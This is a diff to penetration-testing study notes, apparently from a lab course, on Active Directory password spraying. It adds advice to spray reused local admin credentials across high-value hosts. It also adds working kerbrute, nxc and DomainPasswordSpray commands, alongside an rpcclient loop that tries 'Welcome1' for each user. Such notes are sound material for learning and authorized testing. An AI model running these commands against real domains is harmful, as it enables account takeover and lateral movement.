@@ -3,6 +3,7 @@
 - SMB NULL sessions and LDAP anonymous binds are legacy misconfigurations that expose user lists and password policy to unauthenticated attackers.
 - Default domain password policy sets lockout threshold to 0 (disabled), but never assume this. Always enumerate policy first to avoid locking out accounts.
 - Valid user lists can be sourced from SMB NULL sessions, LDAP anonymous binds, Kerbrute enumeration, LinkedIn scraping, or hashes captured via Responder.
+- Local administrator account password reuse is widespread due to gold image deployments. If a local admin hash or cleartext password is obtained, spray it across the network. Prioritize high-value hosts such as SQL and Exchange servers, as privileged users are more likely to be logged in or have credentials cached in memory.
 
 **Default Password Policy:**
 
@@ -89,3 +90,22 @@ Establish an anonymous SMB NULL session from a Windows host. Used as a prerequis
 ```
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
+
+```
+kerbrute passwordspray -d <domain> --dc <dc-ip> <valid-users-file> <password>
+```
+
+Spray a single password against a validated user list via Kerberos. Generates less noise than SMB-based spraying. `-d` specifies the domain, `--dc` specifies the domain controller IP.
+
+```
+sudo nxc smb <dc-ip> -u <valid-users-file> -p <password> | grep +
+```
+
+Spray via SMB from a Linux host. `grep +` filters output to successful authentications only.
+
+**Windows:**
+```
+ Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.
